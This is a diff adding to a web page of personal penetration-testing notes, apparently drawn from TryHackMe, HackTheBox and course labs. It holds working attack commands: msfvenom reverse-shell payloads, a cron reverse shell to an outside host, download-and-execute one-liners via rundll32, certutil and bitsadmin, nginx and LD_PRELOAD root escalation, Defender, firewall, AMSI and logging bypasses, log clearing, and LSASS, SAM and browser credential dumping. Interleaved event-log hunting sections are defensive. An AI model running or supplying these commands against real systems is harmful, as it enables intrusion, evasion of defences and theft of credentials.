@@ -149,6 +149,136 @@ like CrackMapExec (cme) can assist in finding that initial point of entry on the
 network.
 </code></pre></code></div>
 
+<div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>
+DETECT FIREWALLS IN PLACE 
+
+Get-Service WinDefend
+
+Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, BehaviorMonitorEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled
+
+Get-NetFirewallProfile | Format-Table Name, Enabled
+Get-NetFirewallRule | select DisplayName, Enabled, Description
+Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+Get-NetFirewallProfile | Format-Table Name, Enabled
+
+wmic /namespace:\\root\securitycenter2 path antivirusproduct
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
+test inbound connection without extra tools, then we can do the following: 
+Test-NetConnection -ComputerName 127.0.0.1 -Port 80
+
+Get-EventLog -List
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+
+All these commands confirm if the sysmon tool is installed. Once we detect it, we can try to find the sysmon configuration file if we have readable permission to understand what system administrators are monitoring.
+
+findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+
+wmic product get name,version
+Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
+
+redteamers tools:
+https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
+---------------------------
+Enumeration starting with systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+---------------
+
+AlwaysInstallElevated
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+---------------------------------------------------------
+PowerLessShell evade whitelisting
+
+git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
+python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
+
+-----------------------------------------
+
+T1547, where an attacker creates or modifies a shortcut in order to take advantage of this technique.
+https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md
+-------------------------------------
+Windows Subsystem for Linux WSL T1202 
+bash.exe -c "path-to-payload"
+----------------------------------------
+Signed Binary Proxy Execution (T1218)
+wmic.exe process call create calc
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 1740;
+        ReturnValue = 0;
+};
+
+rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+
+explorer.exe /root,"C:\Windows\System32\calc.exe"
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll 
+msfconsole -q 
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ATTACKBOX_IP; set LPORT 443; exploit"
+
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+--------------------------------------------
+ bypass the Windows application whitelisting.
+
+C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
+or
+C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
+--------------------------------------------
+findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
+-------------------------------------------------------
+\\live.sysinternals.com\tools 
+https://live.sysinternals.com/
+---------------------------
+
+Get-Service | Where-Object -Property Status -eq Stopped | Sort-Object
+Uninstall-WindowsFeature -Name Windows-Defender
+
+The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following:
+
+    users
+
+
+    basic networking information
+    file permissions
+    registry permissions
+    scheduled and running tasks
+    insecure files
+
+
+
+
+powershell -ep bypass
+. .\Downloads\PowerView.ps1
+Get-NetGroup -GroupName *admin*    
+Get-NetUser | select cn    
+Get-NetTCPconnection -State 
+Get hot-fix | measure
+Get-NetIPAddress
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+Get-WmiObject Win32_Process | 
+  Select-Object Name, ProcessId, @{Name='Owner';Expression={$_.GetOwner().User}} | 
+  Format-Table -AutoSize
+
+    Process Injection (T1055)
+    Process Hollowing (T1055.012)
+    Process Masquerading (T1055.013)
+wevtutil qe System /q:"*[System[(EventID=4624)]]" /f:text     //An account was successfully logged on.
+</code></pre></code></div>
+
+
 <div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>--------------[previously connected SMB share ]---------
 We can use a tool like Responder to take advantage of those systems looking for a
 hostname and respond to it with our malicious server. Even better is that Responder
@@ -487,8 +617,147 @@ C:\Windows\system32\NOTEPAD.EXE $args[0]
 reg add "HKLM\Software\Classes\txtfile\shell\open\command" /d "powershell.exe -WindowStyle hidden C:\Windows\System32\power2.ps1" /f
 </code></pre></code></div>
 
+
+
 <!-- 3 -->
 <h2 id="description"><a href="#description">Privilege Escalation</a></h2>
+
+
+
+<div class="github-dark">
+    <pre><code>
+----------------------------[PrivEsc Linux nginx GTFObins]----------------------------
+from ippsec box name Broker
+++++++++++++ {read files as root} ++++++++++++++
+
+echo "user root;
+worker_processes auto;
+pid /run/nginx2.pid;
+include /etc/nginx/modules-enabled/*.conf;
+events {
+    worker_connections 768;
+}
+http {
+    server {
+        listen 1337;
+        location / {
+            root /;
+        }
+    }
+}" > /etc/nginx/nginx.conf && nginx -t && curl localhost:1337 && curl localhost:1337/etc/passwd
+
+++++++++++++ {get reverse shell as root} ++++++++++++++
+
+* in the victim:
+
+echo "user root;
+worker_processes auto;
+pid /run/nginx2.pid;
+include /etc/nginx/modules-enabled/*.conf;
+events {
+    worker_connections 768;
+}
+http {
+    server {
+        listen 9001;
+        location / {
+            root /;
+            autoindex on;
+            dav_methods PUT;
+        }
+    }
+}" > /dev/shm/nginx.conf && sudo nginx -c /dev/shm/nginx.conf && curl localhost:9001
+
+* then you should run the following in your arracker machine to upload the file and see it in / in the victim machine 
+curl 10.10.11.243:9001/poc-linux.xml --upload-file poc-linux.xml
+
+
+if it works ! and you really can see the file in / then upload your public key to ssh as follows:
+ssh-keygen -f tinywhoop
+
+curl 10.10.11.243:9001/root/.ssh/authorized_keys --upload-file tinywhoop.pub
+
+ssh -i tinywhoop root@[ip]
+
+* let's say this directory doesn't exists we could enabled move made a directory in the box and moved it there is probably webdev method to create a directory but we will create cron job that will make the reverse shell
+
+echo '1 * * * * bash -c "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1"' > cron && curl 10.10.11.243:9001/var/spool/cron/crontabs/root --upload-file cron
+
+lastly you can send copy of the request to the proxy for debugging any issues
+
+curl 10.10.11.243:9001/root/.ssh/authorized_keys --upload-file broker.pub -x http://localhost:8080
+
+
+-----------------------------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+----------------------------[PrivEsc Linux service]----------------------------
+from TCM course he found a file in the suid
+-----------------------------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+----------------------------[PrivEsc Linux sudo/SUID]----------------------------
+++++++++++++ {CVE-2019-14287 - sudo} ++++++++++++++
+!root
+++++++++++++ {CVE-2019-18634 - sudo} ++++++++++++++
+before sudo version 1.8.26
+pwfeeback
+tryhackme box sudo buffer overflow
+https://github.com/saleemrashid/sudo-cve-2019-18634
+++++++++++++ {CVE-2016-1247 - suid - CVE-2016-1247} ++++++++++++++
+suid must be set in sudo and nginx vulnerable version 
+
+privesc linux binary symlink nginx or
+suid vuln nginxed-root.sh github\
+./nginxed-root.sh /var/log/nginx/error.log
+it will create asymbolic link between the error.log file controllable by you to a malicious file
+
+++++++++++++ {TCM course - suid} ++++++++++++++
+he search for uid files using find / -type f -perm -04000  -ls 2>/dev/null
+he found a file called suid-env he strings it and found service start apache2 he said service he brought from the path so he appended /tmp in the $path and put a service program that starts root session
+
+
+export PATH=/tmp:$PATH
+print $PATH
+/usr/local/bin/suid-env
+++++++++++++ {TCM course - suid2} ++++++++++++++
+if the binary has the specific opath like /usr/sbin/service apache2 start then we can use this method 
+
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }; export -f /usr/sbin/service; /usr/local/bin/suid-env2
+
+++++++++++ {conclusion} +++++++++++++
+TCM course is stealing the content of 
+https://medium.com/@Varma_Chekuri/privilege-escalation-in-linux-2-c2ececd7f385
+
+and explaining it to make money
+the end 
+-----------------------------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+----------------------------[PrivEsc Linux]----------------------------
+++++++++++++ {using LD_PRELOAD} ++++++++++++++
+echo '#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() { 
+    unsetenv("LD_PRELOAD"); 
+    setgid(0); 
+    setuid(0); 
+    system("/bin/bash"); 
+}' > shell.c && gcc -fPIC -shared -o shell.so shell.c -nostartfiles && sudo LD_PRELOAD=$(pwd)/shell.so apache2
+-----------------------------------------------------------------------
+    </code></pre>
+</div>
+
 
 <div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>-------------[Kerberos - MS14-068]---------
 This gave any domain user the ability to privilege escalate to domain
@@ -745,219 +1014,701 @@ sc start windowsscheduler
 (or run my powershell for automation of finding all services with (M) permission for everyone in tsksch to write on service but if you can't find to write on service then check unquoted ;))
 </code></pre></code></div>
 
+
 <!-- 4 -->
-<h2 id="description"><a href="#description">Defence Evasion Phase</a></h2><p>Perchance, Professor Paranoid purposefully painted this puzzling picture to prompt his pupils. Perhaps, you can procure the passphrase.</p>
+<h2 id="description"><a href="#description">Defence Evasion Phase</a></h2>
 
-	<div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>Attachments: chal.gif
-</code></pre></code></div>
+<div class="github-dark">
+    <pre><code>
+net stop "WinDefend"
+sc config "WinDefend" start=disabled
+
+If you don't have privilege to disable services, you can't modify things under services here:
+reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "
+
+So then play with registries:
+
+Add Commands:
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+
+Query Commands:
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring"
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection"
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring"
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable"
+
+Delete Commands:
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /f
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /f
+
+or just run https://gist.github.com/pe3zx/7c5e0080c3b0869ccba1f1dc2ea0c5e0
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+WinDef Exclusion Directory:
+WMIC /NAMESPACE:\\root\Microsoft\Windows\Defender PATH MSFT_MpPreference call Add_ExclusionPath="C:\PerfLogs\"
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
+powershell.exe Add-MpPreference -ExclusionPath C:\Windows;
+
+C:\Windows\Temp
+C:\Users\User
+C:\PerfLogs
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Download and Execution:
+Download tdsskiller to one of the excluded directories and execute:
+
+[T1105]
+certutil.exe -urlcache -f http://192.168.18.235/tdsskiller.exe tdsskiller.exe
+certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+
+[T1027]
+certutil -encode payload.exe Encoded-payload.txt
+
+[T1197]
+bitsadmin /transfer rootkittool /download /priority normal http://192.168.18.235/rootkitremover.exe C:\PerfLogs\RootkitRemover.exe
+bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+
+sc query
+sc query WinDefend
+
+DS0009 process termination
+
+tdsskiller -dcsvc WinDefend
+tdsskiller -dcsvc Bitdefender
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+=== ATTACKERS limit visibility========
+
+How many total events can be used to track event tampering? 
+
+DETECT EVENT LOG CHANGES:
+
+1102
+	Logs when the Windows Security audit log was cleared
+wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text
+
+104
+	Logs when the log file was cleared
+wevtutil qe System /q:"*[System[(EventID=104)]]" /f:text
+
+1100
+	Logs when the Windows Event Log service was shut down
+
+wevtutil qe Security /q:"*[System[(EventID=1100)]]" /f:text
+
+$logs = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"
+$logs.Count
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+
+--------------------------------------------------
+
+STOP logging powershell commands EV:
+
+$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
+[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
+Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
+whoami
+Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
+
+EXPOSE ATTACKERS:
+4103
+	Logs command invocation
+wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4103)]]" /f:text
+
+4104
+	Logs script block execution
+wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text | Select-String -Pattern "Creating" -Context 0,1
+-------------------------
+
+limiting the visibility of 4104 and 4103 disable Windows PowerShell script block logging:
+
+$scriptBlockLogging = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
+$scriptBlockLogging.EnableScriptBlockLogging
+
+$moduleLogging = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue
+$moduleLogging.EnableModuleLogging
+
+
+$moduleLogging = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue
+$moduleLogging.EnableModuleLogging
+
+$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
+$propertyName = "EnableModuleLogging"
+
+Set-ItemProperty -Path $registryPath -Name $propertyName -Value 1
+Set-ItemProperty -Path $registryPath -Name $propertyName -Value 0
+
+
+$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+$valueName = "EnableScriptBlockLogging"
+
+Set-ItemProperty -Path $registryPath -Name $valueName -Value 1
+Set-ItemProperty -Path $registryPath -Name $valueName -Value 0
+
+$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
+
+or use my gpo-bypass.ps1 script
+or use the patchTracingFunc.exe
+---------------
+Hunting metasploit:
+wevtutil epl System C:\path\to\Hunting_Metasploit.evtx
+Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
+
+----------------
+disable Windows PowerShell module logging.
+
+
+$module = Get-Module Microsoft.PowerShell.Utility # Get target module
+$module.LogPipelineExecutionDetails = $false # Set module execution details to false
+$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
+$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
+
+----------------
+History powershell
+$historyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Test-Path $historyPath
+
+Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+----------------------
+STOP script block logging usong gpo-bypass.ps1 
+clear the previous logs if there is no forward logging using
+https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor
+--------------
+ What event ID is to detect a PowerShell downgrade attack? 
+400
+wevtutil qe "Windows PowerShell" /q:"*[System[(EventID=400)]]" /f:text 
+
+Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.
+
+The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.
+
+full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+---------------------------------------------
+bypass the AMSI utility.
+------------------
+ What event ID logs when the log file was cleared? 
+104
+--------------------------
+https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/580595db9f745688bc7477f6/1476761074992/Windows+Logging+Cheat+Sheet_ver_Oct_2016.pdf
+
+Get-WinEvent -ListLog *
+
+WEvtUtil: Use this utility to query your logs
+a. WevtUtil qe Security – query the Security Log for events
+    i. Lots of flags here so read help “WevtUtil -?”
+    ii. /c:5 = Read 5 events
+    iii. /rd:true = newest events first
+    iv. /f:text = format text, also can do XML
+
+b. Success & Failed Logons - WevtUtil qe Security /q:"*[System[(EventID=4624 or EventID=4625)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Logon_Events_Win7.log
+
+c. User Account Change - WevtUtil qe Security /q:"*[System[(EventID=4738)]]" /c:5 /rd:true /f:text >Parsed\%computername%_User_Account_Change_Win7.log
+
+d. New Service Installed - WevtUtil qe Security /q:"*[System[(EventID=7045)]]" /c:5 /rd:true /f:text >Parsed\%computername%_New_Service_Installed_Win7.log
+
+e. User Account Changes - wevtutil qe Security /q:"*[System[(EventID=4725 or EventID=4722 or EventID=4723 or EventID=4724 or EventID=4726 or EventID=4767)]]" /c:10 /f:text
+
+Spotting the Adversary with Windows Event Log Monitoring. 
+
+https://web.archive.org/web/20190115215749/https://apps.nsa.gov/iaarchive/customcf/openAttachment.cfm?FilePath=/iad/library/ia-guidance/security-configuration/applications/assets/public/upload/Spotting-the-Adversary-with-Windows-Event-Log-Monitoring.pdf&WpKes=aF6woL7fQp3dJiqyJL2LenrLxuHC7ztGtVNK3x
+
+Description	ID	Level	Event Log	Event Source
+Firewall Rule Add	2004	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
+Firewall Rule Change	2005	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
+Firewall Rules Deleted	2006, 2033	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
+Firewall Failed to load Group Policy	2009	Error	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
+
+Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Windows Firewall With Advanced Security";Id=2004} | measure | % count
+
+Get-WinEvent -ListProvider * | Where-Object { $_.Name -match "firewall" }
+
+------------------------------------------------------------------------------------------------------------------------
+ATT&CK ID T1098 (Account Manipulation)
+
+Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670. Especially flag events where the subject and target accounts differ[1] or that include additional flags such as changing a password with unusual systems. Especially flag events where the subject and target accounts differ[1] or that include additional flags such as changing a password with unusual systems.
+
+Get-WinEvent -FilterHashtable @{
+    ProviderName="Microsoft-Windows-Security-Auditing"
+    Id=4670,4728,4738
+}
+
+
+------------------------------------------
+Audit Process Creation
+
+Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Security-Auditing";Id=4688} -MaxEvents 10 | Format-List -Property *|findstr /i "process command line"
+Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 }
+----------------------------------------------
+
+a. WevtUtil qe Security – query the Security Log for events
+   i. Lots of flags here so read help “WevtUtil -?”
+   ii. /c:5 = Read 5 events
+   iii. /rd:true = newest events first
+   iv. /f:text = format text, also can do XML
+
+b. Firewall Rule Added - WevtUtil qe Security /q:"*[System[(EventID=2004)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rule_Added.log
+
+c. Firewall Rule Changed - WevtUtil qe Security /q:"*[System[(EventID=2005)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rule_Changed.log
+
+d. Firewall Rules Deleted - WevtUtil qe Security /q:"*[System[(EventID=2006 or EventID=2033)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rules_Deleted.log
+
+e. Firewall Failed to Load Group Policy - wevtutil qe Security /q:"*[System[(EventID=2009)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Failed_GP.log
+----------------------------------------------------------------------------------------------------------------------------------------------------
+This event indicates that the system detected an executable file with invalid page hashes. This could be a sign of file corruption or potentially malicious tampering.
+
+Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 6281 }
+----------------------------------------------------------------------------------------------------
+When a user account is created in Active Directory, event ID 4720 is logged.
+Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4720'
+
+Event ID 4724 is generated every time an account attempts to reset the password for another account
+Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4724' -MaxEvents 1 | Format-List -Property *
+--------
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+----------------------------------
+[SYSMON] - cutting down on noise. 
+Applications and Services Logs/Microsoft/Windows/Sysmon/Operational
+
+Event ID 1: Process Creation
+
+++++++++++++++++++++++++++++++++++++++++
+Event ID 3: Network Connection:
+
+look for network connections coming from port 4444.
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
+
+Hunting Metasploit 
+
+Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
+
+Hunting Rats and C2 Servers Common Back Connect Ports with PowerShell:
+
+ Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Rats.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=8080'
+
+ports to check: https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo/edit#gid=0
+
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 7: Image Loaded
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 8: CreateRemoteThread
+
+Detecting Evasion Techniques
+This is used in multiple evasion techniques including DLL Injection, Thread Hijacking, and Process Hollowing. 
+
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath '*/System/EventID=8'
+
+
+Detecting Evasion Techniques with PowerShell
+
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 10: CreateRemoteThread
+
+MITRE ATTACK T1055 and S0002.
+
+Detecting Mimikatz Abnormal LSASS Behavior MITRE ATTACK T1055 and S0002.
+
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="TargetImage"] and */EventData/Data="C:\Windows\system32\lsass.exe"'
+
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 11: File Created
+
+Hunting Startup Persistence
+
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1023"'
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1165"'
+
+ MITRE ATT&CK T1112.
+Get-WinEvent -Path "C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1060.evtx"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1060,Runkey"'
+Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1060.evtx | 
+    Where-Object { $_.Message -match "RuleName:\s*T1060" }
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | 
+    Where-Object { $_.Message -match "RuleName:\s*T\s*" }
+
+
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1484"'
+Get-WinEvent -Path "C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1023.evtx"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1023"'
+
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 12 / 13 / 14: Registry Event
+Event ID 15: FileCreateStreamHash
+Event ID 22: DNS Event
+
++++++++++++++++++++=====
+THE THREE COMMANDS I USED IN INVESTIGATION:
+Sysmon.exe -accepteula -i ..\Configuration\swift.xml
+
+Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" 
+
+ Get-WinEvent  -LogName "Microsoft-Windows-Sysmon/Operational"   | Where-Object { $_.Message -match "\s*process create\s*" }
+
+ Get-WinEvent  -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx  | Where-Object { $_.Message -match "\s*Network\s*" }  | Format-List -Property *
+
+---------------------------------------------
+
+    </code></pre>
+</div>
+
+
 <!-- 5 -->
-<h2 id="description"><a href="#description">Credential Access Phase</a></h2><p>Perchance, Professor Paranoid purposefully painted this puzzling picture to prompt his pupils. Perhaps, you can procure the passphrase.</p>
+<h2 id="description"><a href="#description">Credential Access Phase</a></h2>
 
-	<div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>Attachments: chal.gif
-</code></pre></code></div>
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+IIS Configuration:
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+The credential dumping book:
+Dump LSA then:
+
+pypykatz lsa minidump lsass1.DMP
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Browser data:
+
+sekurlsa::dpapi
+
+dpapi::chrome /in:"C:\users\user\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:93066b192c77cf3bde8ae511dcccfc278fc52ae2754aaccfe938967542aa38f30b76382f802e9fdf0abd937141422acf5924be0c74f126ec29dbe099fa9427a
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Registry LOLBAS:
+
+reg.exe save hklm\sam C:\temp\sam.save
+reg.exe save hklm\system C:\temp\system.save
+Crack using tools like secreddump.py: https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
